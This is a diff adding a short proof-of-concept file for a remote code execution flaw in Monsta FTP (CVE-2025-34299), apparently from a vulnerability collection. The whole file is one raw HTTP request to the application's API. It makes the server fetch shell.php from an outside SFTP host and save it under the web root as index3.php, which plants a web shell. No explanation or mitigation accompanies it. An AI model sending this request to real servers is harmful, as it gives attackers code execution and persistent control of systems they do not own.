@@ -1,0 +1,7 @@
+# Monsta FTP远程代码执行漏洞 (CVE-2025-34299)
+POST /mftp/application/api/api.php HTTP/1.1
+Host: www.xwd_test.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 391
+
+request={"connectionType":"sftp","configuration":{"host":"{{External-SFTP-IP}}","remoteUsername":"sftpuser","initialDirectory":"/","authenticationModeName":"Password","password":"password111","port":2222},"actionName":"downloadFile","context":{"remotePath":"/shell.php","localPath":"/var/www/html/mftp/index3.php"}}&csrf_token=6e080f63ea774944feedef49eb77c6fffdd8291b9c6561022696b9222942644e
